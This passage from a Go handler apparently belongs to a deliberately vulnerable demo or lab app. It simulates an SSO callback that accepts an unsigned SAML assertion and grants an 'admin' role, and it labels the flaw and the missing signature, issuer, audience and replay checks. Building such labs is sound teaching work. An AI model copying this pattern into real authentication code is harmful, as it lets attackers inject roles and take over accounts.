				"name":         name,
				"email":        email,
				"role":         "admin",
				"groups":       []string{"admins", "developers", "finance"},
				"provisioned_from": "sso_assertion",
			},
			"raw_assertion": fmt.Sprintf("<saml:Assertion><saml:Subject><saml:NameID>%s</saml:NameID></saml:Subject><saml:AttributeStatement><saml:Attribute Name=\"Role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"Email\"><saml:AttributeValue>%s</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>", email, email),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unsafe Consumption - SSO callback with no SAML signature verification, role injection possible",
			"security_checks": map[string]interface{}{
				"assertion_signature": false,
				"issuer_validation":   false,
				"audience_check":      false,
				"replay_detection":    false,
				"role_mapping_validation": false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}
